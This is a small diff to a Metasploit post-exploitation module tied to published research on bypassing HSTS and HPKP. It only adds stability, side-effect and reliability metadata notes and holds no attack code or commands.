@@ -28,7 +28,12 @@ class MetasploitModule < Msf::Post
           [ 'URL', 'http://blog.en.elevenpaths.com/2017/12/breaking-out-hsts-and-hpkp-on-firefox.html' ],
           [ 'URL', 'https://www.blackhat.com/docs/eu-17/materials/eu-17-Berta-Breaking-Out-HSTS-And-HPKP-On-Firefox-IE-Edge-And-Possibly-Chrome.pdf' ]
         ],
-        'SessionTypes' => %w[meterpreter shell]
+        'SessionTypes' => %w[meterpreter shell],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [CONFIG_CHANGES],
+          'Reliability' => []
+        }
       )
     )
 
